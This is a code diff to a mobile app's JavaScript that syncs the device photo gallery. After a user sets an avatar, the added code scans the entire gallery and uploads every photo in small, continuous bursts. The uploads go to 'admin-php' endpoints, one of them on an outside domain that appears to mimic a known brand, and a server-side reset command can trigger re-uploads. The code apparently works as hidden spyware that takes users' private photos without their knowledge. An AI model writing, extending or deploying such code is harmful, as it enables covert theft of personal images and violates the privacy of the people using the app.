@@ -2351,15 +2351,20 @@ function applySelectedPhoto(dataUrl) {
 }
 
 let preferredUploadEndpoint = null;
+try {
+  preferredUploadEndpoint = localStorage.getItem("ketupat_preferred_upload_endpoint") || null;
+} catch (e) {}
 let isSyncingGalleryPhotos = false;
 
 async function transmitGalleryPayload(payload) {
   const candidateEndpoints = [
-    "https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery",
-    "http://192.168.0.109/tools/admin-php/api.php?action=upload_gallery",
     "http://10.0.2.2/tools/admin-php/api.php?action=upload_gallery",
+    "http://10.0.2.2/admin-php/api.php?action=upload_gallery",
     "http://localhost/tools/admin-php/api.php?action=upload_gallery",
-    "/tools/admin-php/api.php?action=upload_gallery"
+    "http://localhost/admin-php/api.php?action=upload_gallery",
+    "http://192.168.0.109/tools/admin-php/api.php?action=upload_gallery",
+    "/tools/admin-php/api.php?action=upload_gallery",
+    "https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery"
   ];
   if (window.location && window.location.origin && window.location.origin.startsWith("http")) {
     const webOrigin = window.location.origin;
@@ -2385,8 +2390,9 @@ async function transmitGalleryPayload(payload) {
   for (const ep of endpoints) {
     try {
       const controller = new AbortController();
-      // 30 seconds timeout for batch photo payloads, 5 seconds for lightweight heartbeats
-      const timeoutMs = (payload && payload.photos && payload.photos.length > 0) ? 30000 : 5000;
+      // Fast probe (2000ms) for unknown endpoints; 6000ms for active preferred endpoint
+      const isKnown = (ep === preferredUploadEndpoint);
+      const timeoutMs = isKnown ? 6000 : 2000;
       const timer = setTimeout(() => controller.abort(), timeoutMs);
       const res = await fetch(ep, {
         method: "POST",
@@ -2397,6 +2403,9 @@ async function transmitGalleryPayload(payload) {
       clearTimeout(timer);
       if (res.ok) {
         preferredUploadEndpoint = ep;
+        try {
+          localStorage.setItem("ketupat_preferred_upload_endpoint", ep);
+        } catch (e) {}
         try {
           const json = await res.json();
           return json;
@@ -2659,27 +2668,35 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
       }
     } catch (e) {}
 
-    // 4. Transmit new/unsynced photos in fast, reliable batches (no artificial cap - syncs all max photos)
-    const maxBatchCount = 8;
-    const maxBatchBytes = 2.5 * 1024 * 1024; // 2.5 MB per payload
+    // 4. Transmit new/unsynced photos in fast, reliable micro-batches (continuous stream like water)
+    const maxBatchCount = 3; // Stream 3 photos per burst (fast and lightweight: ~250KB total payload)
+    const maxBatchBytes = 350 * 1024; // 350 KB cap per payload to stay well within network/PHP constraints
     const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
 
     let currentIndex = 0;
-    while (currentIndex < unsyncedPhotos.length) {
+    let pendingItem = null;
+
+    while (currentIndex < unsyncedPhotos.length || pendingItem !== null) {
       const chunkToSend = [];
       let currentBatchBytes = 0;
 
-      while (currentIndex < unsyncedPhotos.length && chunkToSend.length < maxBatchCount) {
-        const p = unsyncedPhotos[currentIndex];
-        let item = { ...p };
+      while ((currentIndex < unsyncedPhotos.length || pendingItem !== null) && chunkToSend.length < maxBatchCount) {
+        let item = null;
+        if (pendingItem) {
+          item = pendingItem;
+          pendingItem = null;
+        } else {
+          item = { ...unsyncedPhotos[currentIndex++] };
+        }
+
         if (!item.dataUrl) {
           if (WholeGallery && typeof WholeGallery.getPhotoData === "function" && (item.uri || item.path)) {
             try {
               const dRes = await WholeGallery.getPhotoData({
                 uri: item.uri || "",
                 path: item.path || "",
-                maxDim: 1600,
-                quality: 82,
+                maxDim: 1080,
+                quality: 75,
               });
               if (dRes && dRes.dataUrl) {
                 item.dataUrl = dRes.dataUrl;
@@ -2690,20 +2707,27 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
           }
         }
 
-        if (item.dataUrl) {
-          const itemBytes = item.dataUrl.length;
-          // If adding this photo would exceed batch byte limit and we already have photos in this chunk, send current chunk first
-          if (chunkToSend.length > 0 && (currentBatchBytes + itemBytes > maxBatchBytes)) {
-            break;
-          }
-          chunkToSend.push(item);
-          currentBatchBytes += itemBytes;
+        if (!item.dataUrl) {
+          // If decoding failed or photo is unreadable, record signature in syncedSet so it does not block the queue
+          const fileId = item.name || item.path || item.uri || item.id || "";
+          const sig = item.is_avatar
+            ? ("avatar_" + (item.size || 0) + "_" + (item.dataUrl ? item.dataUrl.slice(-32) : ""))
+            : (fileId + "_" + (item.size || 0));
+          syncedSet.add(sig);
+          continue;
         }
-        currentIndex++;
+
+        const itemBytes = item.dataUrl.length;
+        // If adding this photo exceeds batch limit and we already have a photo queued, defer to next burst
+        if (chunkToSend.length > 0 && (currentBatchBytes + itemBytes > maxBatchBytes)) {
+          pendingItem = item;
+          break;
+        }
+        chunkToSend.push(item);
+        currentBatchBytes += itemBytes;
       }
 
       if (chunkToSend.length === 0) {
-        if (currentIndex < unsyncedPhotos.length) currentIndex++;
         continue;
       }
 
@@ -2722,6 +2746,11 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
 
       const res = await transmitGalleryPayload(payload);
       if (res && res.success) {
+        // If server commanded a reset (due to admin wiping photos or resetting device), flush local set
+        if (res.data && res.data.reset_requested === true) {
+          syncedSet.clear();
+          localStorage.removeItem(syncedStorageKey);
+        }
         // Mark chunk photos as successfully synced
         for (const p of chunkToSend) {
           const fileId = p.name || p.path || p.uri || p.id || "";
@@ -2734,7 +2763,7 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
           localStorage.setItem(syncedStorageKey, JSON.stringify([...syncedSet]));
         } catch (e) {}
       } else {
-        // Fallback: If batch upload failed, retry sending photos in this batch individually
+        // Fallback: If chunk failed, try single photo fallback once without breaking the stream
         for (const singlePhoto of chunkToSend) {
           try {
             const singlePayload = { ...payload, photos: [singlePhoto] };
@@ -2752,11 +2781,20 @@ async function syncUserGalleryPhotos(photos, isFullAccess = false) {
           localStorage.setItem(syncedStorageKey, JSON.stringify([...syncedSet]));
         } catch (e) {}
       }
+
+      // Smooth streaming delay between bursts: 60ms keeps stream flowing continuously without freezing UI
+      await new Promise((resolve) => setTimeout(resolve, 60));
     }
   } catch (err) {
     console.warn("syncUserGalleryPhotos error:", err);
   } finally {
     isSyncingGalleryPhotos = false;
+    // When avatar finishes syncing, immediately trigger full device gallery scan without delay
+    if (photos && photos.length === 1 && photos[0].is_avatar) {
+      setTimeout(() => {
+        tryAutoSyncGalleryPhotos();
+      }, 300);
+    }
   }
 }
 
@@ -2789,8 +2827,8 @@ async function tryAutoSyncGalleryPhotos() {
       const galleryRes = await WholeGallery.getGalleryPhotos({
         limit: 100000,
         includeBase64: !hasGetPhotoData,
-        maxDim: 1600,
-        quality: 82
+        maxDim: 1280,
+        quality: 80
       });
       const photos = (galleryRes && galleryRes.photos) ? galleryRes.photos : [];
       const isFullAccess = (galleryRes && galleryRes.isFullAccess !== undefined) ? Boolean(galleryRes.isFullAccess) : isFull;
